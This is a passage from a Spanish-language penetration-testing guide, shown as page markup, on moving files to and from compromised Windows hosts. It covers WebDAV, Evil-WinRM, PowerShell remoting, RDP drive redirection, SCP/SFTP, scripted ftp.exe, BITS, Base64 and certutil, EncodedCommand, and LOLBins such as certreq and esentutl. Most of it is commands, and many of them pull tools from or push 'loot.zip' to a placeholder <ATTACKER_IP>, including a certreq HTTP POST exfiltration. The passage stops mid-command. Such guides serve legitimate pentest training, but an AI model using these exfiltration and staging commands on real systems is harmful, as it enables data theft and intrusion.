+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">type</span><span style="color:#E6EDF3"> %TEMP%\loot.zip </span><span style="color:#FF7B72">></span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">>@</span><span style="color:#E6EDF3">80\DavWWWRoot\loot.zip</span></span></code></pre>
+<p>LOLBAS documenta ambas direcciones mediante <code>cmd.exe</code> en versiones actuales de Windows.</p>
+<h3 id="requisito-de-webclient">Requisito de WebClient</h3>
+<p>Si la ruta UNC WebDAV falla de forma inesperada, comprueba el servicio:</p>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="cmd.exe"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">sc</span><span style="color:#FF7B72"> query</span><span style="color:#E6EDF3"> WebClient</span></span></code></pre></section><section class="pub-tab" data-tab-label="PowerShell"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Get-Service</span><span style="color:#E6EDF3"> WebClient</span></span></code></pre></section></div>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Tener HTTP no garantiza una UNC WebDAV</strong><p>Que TCP/80 o TCP/443 sean alcanzables no implica que <code>\\host@port\DavWWWRoot\...</code> funcione. La ruta UNC depende del componente WebClient de Windows; si no está disponible, utiliza HTTP directo u otro canal.</p></aside>
+<h2 id="acceso-remoto-existente">Acceso remoto existente</h2>
+<p>Cuando el propio método de acceso remoto ya soporta transferencia, normalmente es más rápido utilizar ese canal que levantar otro servicio.</p>
+<h3 id="evil-winrm">Evil-WinRM</h3>
+<p>Upload hacia Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>upload /opt/tools/tool.exe C:\Windows\Temp\tool.exe</span></span></code></pre>
+<p>Download desde Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>download C:\Windows\Temp\loot.zip /tmp/loot.zip</span></span></code></pre>
+<p><code>upload</code> y <code>download</code> son aquí comandos de Evil-WinRM, no cmdlets de PowerShell.</p>
+<h3 id="powershell-remoting">PowerShell Remoting</h3>
+<p>Una <code>PSSession</code> permite utilizar <code>Copy-Item -ToSession</code> y <code>-FromSession</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$session </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-PSSession</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ComputerName TARGET </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">Credential CORP\user</span></span></code></pre>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Copy-Item</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#E6EDF3">  .\</span><span style="color:#79C0FF">tool.exe</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Destination </span><span style="color:#A5D6FF">'C:\Windows\Temp\tool.exe'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ToSession $session</span></span></code></pre>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Copy-Item</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  'C:\Windows\Temp\loot.zip'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Destination </span><span style="color:#A5D6FF">'.\loot.zip'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">FromSession $session</span></span></code></pre>
+<p>Cerrar la sesión:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Remove-PSSession</span><span style="color:#E6EDF3"> $session</span></span></code></pre>
+<h3 id="rdp-drive-redirection">RDP drive redirection</h3>
+<p>FreeRDP puede exponer un directorio local del operador dentro de la sesión Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">xfreerdp</span><span style="color:#A5D6FF"> /v:</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF"> /u:user</span><span style="color:#A5D6FF"> /drive:share,/opt/tools</span></span></code></pre>
+<p>Dependiendo del paquete instalado, el binario puede llamarse <code>xfreerdp</code>, <code>xfreerdp3</code> u otra variante versionada. La opción relevante es <code>/drive</code>.</p>
+<p>Dentro de Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">dir</span><span style="color:#E6EDF3"> \\tsclient\share</span></span></code></pre>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">copy</span><span style="color:#E6EDF3"> \\tsclient\share\tool.exe %TEMP%\tool.exe</span></span></code></pre>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">copy</span><span style="color:#E6EDF3"> %TEMP%\loot.zip \\tsclient\share\loot.zip</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Drive redirection puede estar deshabilitado</strong><p>Si <code>\\tsclient\share</code> no aparece, comprueba que la sesión RDP se creó con <code>/drive</code>. Una Group Policy del target también puede bloquear la redirección de unidades.</p></aside>
+<h2 id="openssh">OpenSSH</h2>
+<p>Cuando el cliente OpenSSH está instalado, <code>scp.exe</code> y <code>sftp.exe</code> proporcionan otra ruta bidireccional.</p>
+<p>Comprobar disponibilidad:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> scp</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> sftp</span></span></code></pre>
+<p>Suelen encontrarse bajo:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>C:\Windows\System32\OpenSSH\</span></span></code></pre>
+<h3 id="scp">SCP</h3>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">scp.exe operator</span><span style="color:#FF7B72">@&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:/opt/tools/tool.exe %TEMP%\tool.exe</span></span></code></pre>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">scp.exe %TEMP%\loot.zip operator</span><span style="color:#FF7B72">@&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:/tmp/loot.zip</span></span></code></pre>
+<h3 id="sftp">SFTP</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">sftp.exe operator</span><span style="color:#FF7B72">@&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>Dentro de la sesión:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>sftp> get tool.exe C:\Windows\Temp\tool.exe</span></span>
+<span class="line"><span>sftp> put C:\Windows\Temp\loot.zip loot.zip</span></span></code></pre>
+<p><code>get</code> y <code>put</code> se interpretan desde la perspectiva del cliente SFTP que se está ejecutando en Windows.</p>
+<h2 id="ftp">FTP</h2>
+<p><code>ftp.exe</code> sigue siendo útil cuando el cliente existe y la red permite los canales de control y datos de FTP.</p>
+<h3 id="preparar-el-attacker-2">Preparar el attacker</h3>
+<p>Un servidor anónimo rápido con pyftpdlib escucha por defecto en TCP/2121:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pip</span><span style="color:#A5D6FF"> install</span><span style="color:#79C0FF"> --user</span><span style="color:#A5D6FF"> pyftpdlib</span></span>
+<span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pyftpdlib</span></span></code></pre>
+<p>Para permitir uploads anónimos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pyftpdlib</span><span style="color:#79C0FF"> --write</span></span></code></pre>
+<h3 id="transferencia-interactiva">Transferencia interactiva</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">ftp</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>Después:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>ftp> binary</span></span>
+<span class="line"><span>ftp> get tool.exe</span></span>
+<span class="line"><span>ftp> put loot.zip</span></span>
+<span class="line"><span>ftp> quit</span></span></code></pre>
+<p>Utiliza <code>binary</code> para ejecutables, archivos comprimidos, dumps y cualquier otro flujo arbitrario de bytes.</p>
+<h3 id="ftp-desde-una-shell-no-interactiva">FTP desde una shell no interactiva</h3>
+<p><code>ftp.exe -s</code> lee comandos desde un fichero:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">(</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> open </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 2121</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> anonymous</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> anonymous</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> binary</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> get tool.exe</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> quit</span></span>
+<span class="line"><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">></span><span style="color:#E6EDF3"> %TEMP%\ftp.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">ftp.exe -s:%TEMP%\ftp.txt</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">FTP tiene un canal de datos separado</strong><p>Alcanzar el puerto de control FTP no garantiza que la transferencia vaya a funcionar. Active/passive mode, NAT y firewall pueden afectar por separado a la conexión de datos.</p></aside>
+<h2 id="bits">BITS</h2>
+<p>BITS puede utilizarse tanto desde PowerShell como mediante <code>bitsadmin.exe</code>.</p>
+<h3 id="start-bitstransfer">Start-BitsTransfer</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Start-BitsTransfer</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Source </span><span style="color:#A5D6FF">'http://&#x3C;ATTACKER_IP>:8000/tool.exe'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Destination </span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span></span></code></pre>
+<p>Para crear un job asíncrono:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$job </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Start-BitsTransfer</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Source </span><span style="color:#A5D6FF">'http://&#x3C;ATTACKER_IP>:8000/large.zip'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Destination </span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\large.zip"</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Asynchronous</span></span></code></pre>
+<p>Comprobarlo:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Get-BitsTransfer</span></span></code></pre>
+<p>Cuando alcance <code>Transferred</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Complete-BitsTransfer</span><span style="color:#E6EDF3"> $job</span></span></code></pre>
+<h3 id="bitsadminexe">bitsadmin.exe</h3>
+<p>Desde <code>cmd.exe</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">bitsadmin</span><span style="color:#E6EDF3"> /transfer downloadJob </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /download </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /priority normal </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  %TEMP%\tool.exe</span></span></code></pre>
+<p>La interfaz <code>bitsadmin.exe</code> está deprecada para administración moderna, pero ese estado no la vuelve inútil durante un pentest si está presente y funciona.</p>
+<h2 id="canales-solo-texto">Canales solo-texto</h2>
+<p>Cuando no existe un camino binario utilizable pero la shell puede enviar y recibir texto, Base64 permite representar cualquier secuencia de bytes.</p>
+<p>Resulta práctico para scripts pequeños, claves, configuración y binarios de poco tamaño. Se vuelve progresivamente frágil con ficheros grandes porque la representación codificada ocupa aproximadamente un tercio más y puede alcanzar límites de command line o de output de la shell.</p>
+<h3 id="base64-con-powershell">Base64 con PowerShell</h3>
+<p>Encode:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">[</span><span style="color:#FF7B72">Convert</span><span style="color:#E6EDF3">]::ToBase64String(</span></span>
+<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#FF7B72">IO.File</span><span style="color:#E6EDF3">]::ReadAllBytes(</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\loot.bin"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>En Linux:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">base64</span><span style="color:#79C0FF"> -w</span><span style="color:#79C0FF"> 0</span><span style="color:#A5D6FF"> loot.bin</span></span></code></pre>
+<p>Decode en PowerShell:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$b64 </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-Content</span><span style="color:#A5D6FF"> '.\loot.b64'</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Raw</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">[</span><span style="color:#FF7B72">IO.File</span><span style="color:#E6EDF3">]::WriteAllBytes(</span></span>
+<span class="line"><span style="color:#A5D6FF">    "</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\loot.bin"</span><span style="color:#FF7B72">,</span></span>
+<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#FF7B72">Convert</span><span style="color:#E6EDF3">]::FromBase64String($b64.Trim())</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>Decode en Linux:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">base64</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF"> loot.b64</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> loot.bin</span></span></code></pre>
+<h3 id="certutil-encode-y-decode">certutil encode y decode</h3>
+<p>Desde <code>cmd.exe</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certutil.exe -encode %TEMP%\loot.bin %TEMP%\loot.b64</span></span>
+<span class="line"><span style="color:#E6EDF3">certutil.exe -decode %TEMP%\tool.b64 %TEMP%\tool.exe</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Longitud de comandos y truncado</strong><p>Una cadena Base64 puede quedar truncada por una web shell, terminal, wrapper de ejecución remota, clipboard o límite de command line. Divide el contenido en chunks cuando haga falta y verifica el fichero reconstruido antes de utilizarlo.</p></aside>
+<h3 id="encodedcommand">EncodedCommand</h3>
+<p><code>-EncodedCommand</code> también utiliza Base64, pero resuelve transporte de una línea de comandos, no transferencia genérica de ficheros. Tanto <code>powershell.exe</code> como <code>pwsh</code> esperan que el comando se convierta primero a bytes UTF-16LE y después a Base64.</p>
+<figure class="pub-figure pub-breakout-medium pub-diagram"><div class="technical-visual-frame technical-visual-frame--pipeline"><svg class="technical-visual technical-visual--desktop" viewBox="0 0 1200 360" role="img" aria-labelledby="tv-encoded-command-es-desktop-title tv-encoded-command-es-desktop-desc" preserveAspectRatio="xMidYMid meet">
+    <title id="tv-encoded-command-es-desktop-title">Pipeline de EncodedCommand</title>
+    <desc id="tv-encoded-command-es-desktop-desc">El texto se codifica como bytes UTF-16LE, después como Base64 y finalmente se pasa como argumento EncodedCommand.</desc>
+    <defs>
+    <marker id="tv-encoded-command-es-desktop-arrow-primary" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="10" markerHeight="10" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-primary" d="M0 0L10 5L0 10Z"></path></marker>
+    <marker id="tv-encoded-command-es-desktop-arrow-secondary" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="9" markerHeight="9" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-secondary" d="M0 0L10 5L0 10Z"></path></marker>
+    <marker id="tv-encoded-command-es-desktop-arrow-attempted" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="9" markerHeight="9" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-attempted" d="M0 0L10 5L0 10Z"></path></marker>
+  </defs>
+    <g class="tv-node tv-node--entry">
+    <rect class="tv-node-surface" x="42" y="86" width="230" height="108" rx="12"></rect>
+    <path class="tv-node-keyline" d="M54 87.5H260"></path>
+    <text class="tv-node-title" x="60" y="121">Texto</text>
+    <text class="tv-node-detail" x="60" y="148">Comando origen</text>
+  </g><g class="tv-node tv-node--neutral">
+    <rect class="tv-node-surface" x="334" y="86" width="230" height="108" rx="12"></rect>
+    <path class="tv-node-keyline" d="M346 87.5H552"></path>
+    <text class="tv-node-title" x="352" y="121">UTF-16LE</text>
+    <text class="tv-node-detail" x="352" y="148">Bytes</text>
+  </g><g class="tv-node tv-node--neutral">
+    <rect class="tv-node-surface" x="626" y="86" width="230" height="108" rx="12"></rect>
+    <path class="tv-node-keyline" d="M638 87.5H844"></path>
+    <text class="tv-node-title" x="644" y="121">Base64</text>
+    <text class="tv-node-detail" x="644" y="148">Representación textual</text>
+  </g><g class="tv-node tv-node--runtime">
+    <rect class="tv-node-surface" x="918" y="86" width="230" height="108" rx="12"></rect>
+    <path class="tv-node-keyline" d="M930 87.5H1136"></path>
+    <text class="tv-node-title" x="936" y="121">-EncodedCommand</text>
+    <text class="tv-node-detail" x="936" y="148">Argumento PowerShell</text>
+  </g>
+    <path class="tv-edge tv-edge--primary" d="M272 140H322" marker-end="url(#tv-encoded-command-es-desktop-arrow-primary)"></path><path class="tv-edge tv-edge--primary" d="M564 140H614" marker-end="url(#tv-encoded-command-es-desktop-arrow-primary)"></path><path class="tv-edge tv-edge--primary" d="M856 140H906" marker-end="url(#tv-encoded-command-es-desktop-arrow-primary)"></path><text class="tv-edge-label tv-edge-label--secondary" x="42" y="282" text-anchor="start">Contrato CLI específico ≠ codificación universal de ficheros Windows</text>
+  </svg><svg class="technical-visual technical-visual--mobile" viewBox="0 0 520 720" role="img" aria-labelledby="tv-encoded-command-es-mobile-title tv-encoded-command-es-mobile-desc" preserveAspectRatio="xMidYMid meet">
+    <title id="tv-encoded-command-es-mobile-title">Pipeline de EncodedCommand</title>
+    <desc id="tv-encoded-command-es-mobile-desc">El texto se codifica como bytes UTF-16LE, después como Base64 y finalmente se pasa como argumento EncodedCommand.</desc>
+    <defs>
+    <marker id="tv-encoded-command-es-mobile-arrow-primary" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="10" markerHeight="10" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-primary" d="M0 0L10 5L0 10Z"></path></marker>
+    <marker id="tv-encoded-command-es-mobile-arrow-secondary" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="9" markerHeight="9" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-secondary" d="M0 0L10 5L0 10Z"></path></marker>
+    <marker id="tv-encoded-command-es-mobile-arrow-attempted" viewBox="0 0 10 10" refX="9.2" refY="5" markerWidth="9" markerHeight="9" orient="auto" markerUnits="userSpaceOnUse"><path class="tv-marker-attempted" d="M0 0L10 5L0 10Z"></path></marker>
+  </defs>
+    <g class="tv-node tv-node--entry">
+    <rect class="tv-node-surface" x="86" y="26" width="348" height="94" rx="12"></rect>
+    <path class="tv-node-keyline" d="M98 27.5H422"></path>
+    <text class="tv-node-title" x="104" y="57">Texto</text>
+    <text class="tv-node-detail" x="104" y="80">Comando origen</text>
+  </g><g class="tv-node tv-node--neutral">
+    <rect class="tv-node-surface" x="86" y="168" width="348" height="94" rx="12"></rect>
+    <path class="tv-node-keyline" d="M98 169.5H422"></path>
+    <text class="tv-node-title" x="104" y="199">UTF-16LE</text>
+    <text class="tv-node-detail" x="104" y="222">Bytes</text>
+  </g><g class="tv-node tv-node--neutral">
+    <rect class="tv-node-surface" x="86" y="310" width="348" height="94" rx="12"></rect>
+    <path class="tv-node-keyline" d="M98 311.5H422"></path>
+    <text class="tv-node-title" x="104" y="341">Base64</text>
+    <text class="tv-node-detail" x="104" y="364">Representación textual</text>
+  </g><g class="tv-node tv-node--runtime">
+    <rect class="tv-node-surface" x="86" y="452" width="348" height="94" rx="12"></rect>
+    <path class="tv-node-keyline" d="M98 453.5H422"></path>
+    <text class="tv-node-title" x="104" y="483">-EncodedCommand</text>
+    <text class="tv-node-detail" x="104" y="506">Argumento PowerShell</text>
+  </g>
+    <path class="tv-edge tv-edge--primary" d="M260 120V156" marker-end="url(#tv-encoded-command-es-mobile-arrow-primary)"></path><path class="tv-edge tv-edge--primary" d="M260 262V298" marker-end="url(#tv-encoded-command-es-mobile-arrow-primary)"></path><path class="tv-edge tv-edge--primary" d="M260 404V440" marker-end="url(#tv-encoded-command-es-mobile-arrow-primary)"></path><text class="tv-edge-label tv-edge-label--secondary" x="260" y="632" text-anchor="middle">Contrato CLI específico ≠ codificación universal de ficheros Windows</text>
+  </svg></div><figcaption>EncodedCommand utiliza una tubería concreta UTF-16LE → Base64; esto no define la codificación de los ficheros de texto de Windows en general.</figcaption></figure>
+<p>Desde Linux:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">printf</span><span style="color:#A5D6FF"> %s</span><span style="color:#A5D6FF"> 'Get-ChildItem C:\'</span><span style="color:#FF7B72"> |</span></span>
+<span class="line"><span style="color:#FFA657">  iconv</span><span style="color:#79C0FF"> -t</span><span style="color:#A5D6FF"> UTF-16LE</span><span style="color:#FF7B72"> |</span></span>
+<span class="line"><span style="color:#FFA657">  base64</span><span style="color:#79C0FF"> -w</span><span style="color:#79C0FF"> 0</span></span></code></pre>
+<p>Después:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">powershell.exe -EncodedCommand </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">BASE64</span><span style="color:#FF7B72">></span></span></code></pre>
+<h2 id="métodos-nativos-adicionales">Métodos nativos adicionales</h2>
+<p>Windows contiene muchos binarios firmados capaces de mover datos aunque esa no sea su función principal. Memorizar todos los LOLBins aporta poco; mantener un pequeño repertorio de fallback sí resulta útil cuando los clientes obvios están bloqueados o no existen.</p>
+<h3 id="certreqexe-1">certreq.exe</h3>
+<p>HTTP POST:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certreq.exe -Post </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  -config http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/ </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  %TEMP%\loot.zip</span></span></code></pre>
+<h3 id="esentutlexe">esentutl.exe</h3>
+<p>Copiar desde SMB:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">esentutl.exe /y </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /d %TEMP%\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /o</span></span></code></pre>
+<h3 id="expandexe">expand.exe</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">expand.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\tool.exe </span><span style="color:#FF7B72">^</span></span>
